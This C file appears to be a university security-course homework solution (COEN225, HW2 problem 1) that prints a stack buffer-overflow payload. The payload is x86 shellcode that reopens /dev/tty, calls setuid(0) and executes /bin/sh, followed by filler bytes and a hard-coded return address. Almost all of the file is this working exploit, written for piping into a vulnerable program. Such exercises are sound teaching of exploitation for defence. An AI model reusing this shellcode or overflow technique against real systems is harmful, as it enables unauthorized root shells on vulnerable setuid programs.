/*  
*   Stephen Tambussi
*   COEN225
*   HW2: problem 1
*   10/18/22
*/
#include <stdio.h>

//50 bytes
char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80" //8 bytes
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80" //17 bytes
"\x6a\x17\x58\x31\xdb\xcd\x80" // <-----these 7 bytes will call setuid(0)
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; //18 bytes

//206 bytes
char filler[] =
"00000000000000000000000000000000000000000000000000" //50 bytes
"00000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000000000000000000000"
"000000"; //6 bytes

int main()
{
    unsigned int nonprintable=0xbffff550; //return address --> 4 bytes
    //unsigned int nonprintable2=0x00;
    printf("%s%s%s\n", sc, filler, (char *)&nonprintable);
    return 0;
}